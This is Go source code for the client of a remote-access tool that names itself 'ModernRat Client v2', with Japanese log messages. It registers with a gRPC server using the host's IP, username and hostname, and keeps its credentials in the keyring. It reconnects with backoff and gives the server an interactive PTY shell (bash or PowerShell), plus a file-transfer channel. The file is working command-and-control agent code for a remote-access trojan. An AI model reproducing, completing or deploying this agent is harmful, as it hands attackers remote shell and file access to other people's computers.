package main

import (
	"context"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"os/user"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	gpty "github.com/aymanbagabas/go-pty"
	pb "modernrat-client/gen"
	"modernrat-client/internal/identity"

	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/status"
)

const (
	address                 = "localhost:50051"
	reconnectInitialBackoff = time.Second
	reconnectMaxBackoff     = 30 * time.Second
	heartbeatInterval       = 5 * time.Second
)

func main() {
	log.SetFlags(log.LstdFlags | log.Lmicroseconds)

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGINT, syscall.SIGTERM)
	defer stop()

	conn, err := grpc.DialContext(ctx, address, grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
	if err != nil {
		log.Fatalf("サーバー接続失敗: %v", err)
	}
	defer conn.Close()

	userClient := pb.NewUserRegistrationServiceClient(conn)
	shellClient := pb.NewRemoteShellServiceClient(conn)
	fileClient := pb.NewFileTransferServiceClient(conn)

	systemInfo := buildSystemInfo()

	savedID, savedSecret, identityErr := identity.Load()
	if identityErr != nil {
		switch {
		case errors.Is(identityErr, identity.ErrBackendUnavailable):
			log.Printf("Keyring が利用できないため資格情報をローカルファイルから読み込みます: %v", identityErr)
		case !errors.Is(identityErr, identity.ErrNotFound):
			log.Printf("Keyring からクライアントIDを読み取れませんでした: %v", identityErr)
		}
	}

	userID, issuedSecret, err := registerAndGetUserID(ctx, userClient, systemInfo, savedID, savedSecret)
	if err != nil && status.Code(err) == codes.Unauthenticated {
		log.Printf("保存済みクライアントシークレットが無効のため再登録します: %v", err)
		if clearErr := identity.Clear(); clearErr != nil {
			if errors.Is(clearErr, identity.ErrBackendUnavailable) {
				log.Printf("保存済みクライアント情報の削除で警告が発生しました: %v", clearErr)
			} else {
				log.Printf("Keyring のクライアント情報削除に失敗しました: %v", clearErr)
			}
		}
		userID, issuedSecret, err = registerAndGetUserID(ctx, userClient, systemInfo, "", "")
	}
	if err != nil {
		log.Fatalf("ユーザー登録に失敗しました: %v", err)
	}

	if issuedSecret != "" {
		if err := identity.Save(userID, issuedSecret); err != nil {
			if errors.Is(err, identity.ErrBackendUnavailable) {
				log.Printf("Keyring が利用できないためクライアント情報をローカルファイルに保存しました: %v", err)
			} else {
				log.Printf("Keyring へのクライアント情報保存に失敗しました: %v", err)
			}
		}
	} else if savedID == "" || savedSecret == "" {
		log.Printf("警告: サーバーからクライアントシークレットが返却されませんでした (ユーザーID=%s)", userID)
	}

	log.Printf("ユーザー登録完了: UserID=%s", userID)

	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		if err := runRemoteShellClient(ctx, shellClient, userID); err != nil && !errors.Is(err, context.Canceled) {
			log.Printf("リモートシェルクライアントでエラー発生: %v", err)
			stop()
		}
	}()

	wg.Add(1)
	go func() {
		defer wg.Done()
		if err := runFileTransferClient(ctx, fileClient, userID); err != nil && !errors.Is(err, context.Canceled) && !errors.Is(err, io.EOF) {
			log.Printf("ファイル転送クライアントでエラー発生: %v", err)
			stop()
		}
	}()

	<-ctx.Done()
	log.Printf("クライアント終了シグナルを受信しました: %v", ctx.Err())
	wg.Wait()
	log.Printf("リモートエージェントを終了します")
}

func registerAndGetUserID(ctx context.Context, client pb.UserRegistrationServiceClient, systemInfo *pb.SystemInfo, clientID, clientSecret string) (string, string, error) {
	req := &pb.RegisterUserRequest{
		SystemInfo: systemInfo,
		UserAgent:  "ModernRat Client v2",
		Timestamp:  time.Now().Unix(),
	}
	if clientID != "" && clientSecret != "" {
		req.ClientId = clientID
		req.ClientSecret = clientSecret
	}

	regCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()

	resp, err := client.RegisterUser(regCtx, req)
	if err != nil {
		return "", "", err
	}
	if !resp.GetSuccess() {
		return "", "", fmt.Errorf("ユーザー登録失敗: %s", resp.GetMessage())
	}
	return resp.GetUserId(), resp.GetClientSecret(), nil
}

func runRemoteShellClient(ctx context.Context, client pb.RemoteShellServiceClient, userID string) error {
	backoff := reconnectInitialBackoff

	for {
		if err := ctx.Err(); err != nil {
			return err
		}

		stream, err := client.ClientShell(ctx)
		if err != nil {
			if ctx.Err() != nil {
				return ctx.Err()
			}
			log.Printf("ClientShell 接続失敗: %v", err)
		} else {
			state := newRemoteShellState(stream, userID)
			if err := state.send(&pb.ShellMessage{Type: pb.ShellMessageType_SHELL_MESSAGE_TYPE_REGISTER, Text: "client ready"}); err != nil {
				log.Printf("REGISTER 送信失敗: %v", err)
			} else {
				log.Printf("リモートシェルチャネルに登録しました (user=%s)", userID)
				state.startHeartbeat(ctx, heartbeatInterval)
				err = state.receiveLoop(ctx)
			}
			state.shutdown()

			if err != nil && !errors.Is(err, context.Canceled) {
				log.Printf("シェルストリーム終了: %v", err)
			}
		}

		if ctx.Err() != nil {
			return ctx.Err()
		}

		wait := backoff
		if wait > reconnectMaxBackoff {
			wait = reconnectMaxBackoff
		}
		log.Printf("%v 後に再接続を試みます", wait)
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(wait):
		}

		if backoff < reconnectMaxBackoff {
			backoff *= 2
			if backoff > reconnectMaxBackoff {
				backoff = reconnectMaxBackoff
			}
		}
	}
}

type remoteShellState struct {
	stream             pb.RemoteShellService_ClientShellClient
	userID             string
	sendMu             sync.Mutex
	sessionMu          sync.RWMutex
	sessions           map[string]*clientShellSession
	heartbeatStop      chan struct{}
	heartbeatStartOnce sync.Once
	heartbeatStopOnce  sync.Once
}

func newRemoteShellState(stream pb.RemoteShellService_ClientShellClient, userID string) *remoteShellState {
	return &remoteShellState{
		stream:        stream,
		userID:        userID,
		sessions:      make(map[string]*clientShellSession),
		heartbeatStop: make(chan struct{}),
	}
}

func (s *remoteShellState) send(msg *pb.ShellMessage) error {
	if msg == nil {
		return nil
	}
	if msg.UserId == "" {
		msg.UserId = s.userID
	}

	s.sendMu.Lock()
	defer s.sendMu.Unlock()
	return s.stream.Send(msg)
}

func (s *remoteShellState) startHeartbeat(ctx context.Context, interval time.Duration) {
	s.heartbeatStartOnce.Do(func() {
		go func() {
			ticker := time.NewTicker(interval)
			defer ticker.Stop()
			for {
				select {
				case <-ctx.Done():
					return
				case <-s.heartbeatStop:
					return
				case <-ticker.C:
					if err := s.send(&pb.ShellMessage{
						Type: pb.ShellMessageType_SHELL_MESSAGE_TYPE_HEARTBEAT,
						Ts:   time.Now().Unix(),
					}); err != nil {
						log.Printf("HEARTBEAT 送信失敗: %v", err)
					}
				}
			}
		}()
	})
}

func (s *remoteShellState) stopHeartbeat() {
	s.heartbeatStopOnce.Do(func() {
		close(s.heartbeatStop)
	})
}

func (s *remoteShellState) sendError(sessionID, text string) error {
	return s.send(&pb.ShellMessage{
		Type:      pb.ShellMessageType_SHELL_MESSAGE_TYPE_ERROR,
		SessionId: sessionID,
		Text:      text,
	})
}

func (s *remoteShellState) receiveLoop(ctx context.Context) error {
	for {
		if err := ctx.Err(); err != nil {
			return err
		}

		msg, err := s.stream.Recv()
		if err != nil {
			return err
		}

		switch msg.GetType() {
		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_REGISTERED:
			log.Printf("リモートシェル登録ACK: %s", msg.GetText())

		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_OPEN:
			if err := s.handleOpen(ctx, msg); err != nil {
				return err
			}

		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_STDIN:
			if err := s.handleStdin(msg); err != nil {
				return err
			}

		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_RESIZE:
			s.handleResize(msg)

		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_CLOSE:
			if s.handleServerClose(msg) {
				return io.EOF
			}

		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_HEARTBEAT:
			// サーバーからのハートビートは現状使用しないため無視

		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_ERROR:
			log.Printf("サーバーからのエラー: session=%s message=%s", msg.GetSessionId(), msg.GetText())

		default:
			log.Printf("未対応のメッセージタイプを受信: %v", msg.GetType())
		}
	}
}

func (s *remoteShellState) handleOpen(ctx context.Context, msg *pb.ShellMessage) error {
	sessionID := msg.GetSessionId()
	if sessionID == "" {
		return s.sendError("", "session_id が指定されていません")
	}

	shellPath, shellArgs := defaultShellCommand()
	session, err := newClientShellSession(ctx, s, sessionID, shellPath, shellArgs)
	if err != nil {
		log.Printf("シェルセッション開始に失敗: %v", err)
		return s.sendError(sessionID, fmt.Sprintf("シェル起動失敗: %v", err))
	}

	s.sessionMu.Lock()
	s.sessions[sessionID] = session
	s.sessionMu.Unlock()

	log.Printf("シェルセッション開始: session=%s", sessionID)

	// Apply initial resize if provided
	if c, r := int(msg.GetCols()), int(msg.GetRows()); c > 0 && r > 0 {
		session.resize(c, r)
	}

	if err := s.send(&pb.ShellMessage{
		Type:      pb.ShellMessageType_SHELL_MESSAGE_TYPE_ACCEPTED,
		SessionId: sessionID,
		Text:      "shell ready",
	}); err != nil {
		log.Printf("ACCEPTED 送信失敗: %v", err)
		session.stop("ACCEPTED 送信失敗")
		return err
	}

	return nil
}

func (s *remoteShellState) handleResize(msg *pb.ShellMessage) {
	cols, rows := int(msg.GetCols()), int(msg.GetRows())
	if cols <= 0 || rows <= 0 {
		return
	}
	s.sessionMu.RLock()
	session := s.sessions[msg.GetSessionId()]
	s.sessionMu.RUnlock()
	if session == nil {
		return
	}
	session.resize(cols, rows)
}

func (s *remoteShellState) handleStdin(msg *pb.ShellMessage) error {
	data := msg.GetData()
	if len(data) == 0 {
		return nil
	}

	s.sessionMu.RLock()
	session := s.sessions[msg.GetSessionId()]
	s.sessionMu.RUnlock()

	if session == nil {
		return s.sendError(msg.GetSessionId(), "アクティブなセッションがありません")
	}

	if err := session.write(data); err != nil {
		log.Printf("シェルへの書き込みに失敗: %v", err)
		session.stop("STDIN 書き込み失敗")
		return s.sendError(session.id, fmt.Sprintf("書き込みエラー: %v", err))
	}

	return nil
}

func (s *remoteShellState) handleServerClose(msg *pb.ShellMessage) bool {
	s.sessionMu.RLock()
	session := s.sessions[msg.GetSessionId()]
	s.sessionMu.RUnlock()

	if session == nil {
		return false
	}

	log.Printf("サーバーからの CLOSE を受信: session=%s", session.id)
	session.stop("サーバー要求により終了")
	s.clearSession(session)

	reason := strings.ToLower(strings.TrimSpace(msg.GetText()))
	if strings.Contains(reason, "server shutting down") {
		s.shutdown()
		if closer, ok := s.stream.(interface{ CloseSend() error }); ok {
			_ = closer.CloseSend()
		}
		return true
	}

	return false
}

func (s *remoteShellState) clearSession(session *clientShellSession) {
	s.sessionMu.Lock()
	if s.sessions[session.id] == session {
		delete(s.sessions, session.id)
	}
	s.sessionMu.Unlock()
}

func (s *remoteShellState) shutdown() {
	s.stopHeartbeat()
	s.sessionMu.RLock()
	snapshot := make([]*clientShellSession, 0, len(s.sessions))
	for _, ss := range s.sessions {
		snapshot = append(snapshot, ss)
	}
	s.sessionMu.RUnlock()
	for _, ss := range snapshot {
		ss.stop("クライアント終了")
	}
}

func (s *remoteShellState) onSessionExit(session *clientShellSession, exitCode int, message string) {
	s.clearSession(session)

	if err := s.send(&pb.ShellMessage{
		Type:      pb.ShellMessageType_SHELL_MESSAGE_TYPE_CLOSE,
		SessionId: session.id,
		Text:      message,
		ExitCode:  int32(exitCode),
	}); err != nil {
		log.Printf("CLOSE 送信失敗: %v", err)
	}
}

type clientShellSession struct {
	state    *remoteShellState
	id       string
	cmd      *gpty.Cmd
	pty      gpty.Pty
	writeMu  sync.Mutex
	stopOnce sync.Once
	ioOnce   sync.Once
	done     chan struct{}
}

func newClientShellSession(ctx context.Context, state *remoteShellState, sessionID, shellPath string, shellArgs []string) (*clientShellSession, error) {
	ptyHandle, err := gpty.New()
	if err != nil {
		return nil, err
	}

	cmd := ptyHandle.Command(shellPath, shellArgs...)
	cmd.Env = append(os.Environ(), "TERM=xterm-256color", "COLORTERM=truecolor", "SHELL="+shellPath)
	cmd.Dir = homeDirectory()

	if err := cmd.Start(); err != nil {
		_ = ptyHandle.Close()
		return nil, err
	}

	session := &clientShellSession{
		state: state,
		id:    sessionID,
		cmd:   cmd,
		pty:   ptyHandle,
		done:  make(chan struct{}),
	}

	go session.readLoop()
	go session.waitLoop()

	go func() {
		select {
		case <-ctx.Done():
			session.stop("コンテキストキャンセル")
		case <-session.done:
		}
	}()

	return session, nil
}

func (s *clientShellSession) write(data []byte) error {
	s.writeMu.Lock()
	defer s.writeMu.Unlock()

	if s.pty == nil {
		return errors.New("pty が閉じています")
	}

	_, err := s.pty.Write(data)
	return err
}

func (s *clientShellSession) readLoop() {
	ptyHandle := s.pty
	if ptyHandle == nil {
		return
	}

	buf := make([]byte, 4096)

	for {
		n, err := ptyHandle.Read(buf)
		if n > 0 {
			chunk := append([]byte(nil), buf[:n]...)
			if err := s.state.send(&pb.ShellMessage{
				Type:      pb.ShellMessageType_SHELL_MESSAGE_TYPE_STDOUT,
				SessionId: s.id,
				Data:      chunk,
			}); err != nil {
				log.Printf("STDOUT 送信失敗: %v", err)
				s.stop("STDOUT 送信失敗")
				return
			}
		}

		if err != nil {
			if !errors.Is(err, os.ErrClosed) && !errors.Is(err, io.EOF) {
				log.Printf("PTY 読み取りエラー: %v", err)
			}
			return
		}
	}
}

func (s *clientShellSession) waitLoop() {
	if s.cmd == nil {
		return
	}

	err := s.cmd.Wait()

	s.closeIO()

	exitCode := 0
	message := "shell exited"

	if err != nil {
		var exitErr *exec.ExitError
		if errors.As(err, &exitErr) {
			exitCode = exitErr.ExitCode()
			message = fmt.Sprintf("shell exited with code %d", exitCode)
		} else {
			exitCode = -1
			message = fmt.Sprintf("shell wait error: %v", err)
		}
	}

	s.state.onSessionExit(s, exitCode, message)
}

func (s *clientShellSession) stop(reason string) {
	s.stopOnce.Do(func() {
		log.Printf("シェルセッションを停止します: session=%s reason=%s", s.id, reason)
		s.stopProcess()
		s.closeIO()
	})
}

func (s *clientShellSession) stopProcess() {
	if s.cmd == nil {
		return
	}

	if s.cmd.Cancel != nil {
		if err := s.cmd.Cancel(); err != nil && !errors.Is(err, os.ErrProcessDone) {
			log.Printf("シェルプロセスの cancel に失敗: %v", err)
		}
		return
	}

	if s.cmd.Process != nil {
		if err := s.cmd.Process.Kill(); err != nil && !errors.Is(err, os.ErrProcessDone) {
			log.Printf("シェルプロセスの kill に失敗: %v", err)
		}
	}
}

func (s *clientShellSession) closeIO() {
	s.ioOnce.Do(func() {
		if s.pty != nil {
			_ = s.pty.Close()
			s.pty = nil
		}
		close(s.done)
	})
}

func (s *clientShellSession) resize(cols, rows int) {
	if s.pty == nil {
		return
	}
	// API expects width (cols), height (rows)
	if err := s.pty.Resize(cols, rows); err != nil {
		log.Printf("PTY リサイズ失敗: %v (cols=%d rows=%d)", err, cols, rows)
	}
}

func buildSystemInfo() *pb.SystemInfo {
	monitors := getMonitorInfo()

	return &pb.SystemInfo{
		IpAddress:     getLocalIP(),
		Username:      getCurrentUser(),
		OsInfo:        getOSInfo(),
		MonitorCount:  int32(len(monitors)),
		Monitors:      monitors,
		CpuInfo:       getCPUInfo(),
		TotalMemoryMb: getTotalMemory(),
		Hostname:      getHostname(),
	}
}

func getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "127.0.0.1"
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

func getCPUInfo() *pb.CPUInfo {
	return &pb.CPUInfo{
		Model:        getCPUModel(),
		Cores:        int32(runtime.NumCPU()),
		Threads:      int32(runtime.NumCPU()),
		FrequencyMhz: 0,
		Architecture: runtime.GOARCH,
	}
}

func getCPUModel() string {
	switch runtime.GOOS {
	case "linux":
		return "Linux CPU (" + runtime.GOARCH + ")"
	case "windows":
		return "Windows CPU (" + runtime.GOARCH + ")"
	case "darwin":
		return "macOS CPU (" + runtime.GOARCH + ")"
	default:
		return "Unknown CPU (" + runtime.GOARCH + ")"
	}
}

func getOSInfo() *pb.OSInfo {
	return &pb.OSInfo{
		Name:          runtime.GOOS,
		Version:       getOSVersion(),
		Build:         "unknown",
		KernelVersion: "unknown",
	}
}

func getOSVersion() string {
	switch runtime.GOOS {
	case "linux":
		return "Linux " + runtime.GOARCH
	case "windows":
		return "Windows " + runtime.GOARCH
	case "darwin":
		return "macOS " + runtime.GOARCH
	default:
		return "Unknown OS"
	}
}

func getMonitorInfo() []*pb.MonitorInfo {
	return []*pb.MonitorInfo{
		{
			Width:     1920,
			Height:    1080,
			IsPrimary: true,
			Name:      "Primary Monitor",
		},
	}
}

func getCurrentUser() string {
	if u, err := user.Current(); err == nil {
		if idx := strings.Index(u.Username, "\\"); idx >= 0 {
			return u.Username[idx+1:]
		}
		return u.Username
	}
	return "unknown"
}

func getHostname() string {
	if hostname, err := os.Hostname(); err == nil {
		return hostname
	}
	return "unknown"
}

func getTotalMemory() int64 {
	return 8192
}

func defaultShellCommand() (string, []string) {
	switch runtime.GOOS {
	case "windows":
		// Prefer PowerShell Core (pwsh) then Windows PowerShell (powershell.exe).
		// Always try to return an absolute path to avoid it being resolved relative to Dir.
		if path, err := exec.LookPath("pwsh.exe"); err == nil {
			return path, []string{"-NoLogo", "-NoProfile"}
		}
		if pf := os.Getenv("ProgramFiles"); pf != "" {
			p := pf + string(os.PathSeparator) + "PowerShell" + string(os.PathSeparator) + "7" + string(os.PathSeparator) + "pwsh.exe"
			if _, err := os.Stat(p); err == nil {
				return p, []string{"-NoLogo", "-NoProfile"}
			}
		}
		if sysRoot := os.Getenv("SystemRoot"); sysRoot != "" {
			p := sysRoot + string(os.PathSeparator) + "System32" + string(os.PathSeparator) + "WindowsPowerShell" + string(os.PathSeparator) + "v1.0" + string(os.PathSeparator) + "powershell.exe"
			if _, err := os.Stat(p); err == nil {
				return p, []string{"-NoLogo", "-NoProfile"}
			}
		}
		if path, err := exec.LookPath("powershell.exe"); err == nil {
			return path, []string{"-NoLogo", "-NoProfile"}
		}
		// Final fallback
		return "powershell.exe", []string{"-NoLogo", "-NoProfile"}
	case "darwin", "linux":
		// Prefer bash, then zsh, fallback to sh.
		if path, err := exec.LookPath("bash"); err == nil {
			return path, []string{"-i"}
		}
		if path, err := exec.LookPath("zsh"); err == nil {
			return path, []string{"-i"}
		}
		return "/bin/sh", []string{"-i"}
	default:
		return "/bin/sh", []string{"-i"}
	}
}

func homeDirectory() string {
	if dir, err := os.UserHomeDir(); err == nil {
		return dir
	}
	return ""
}
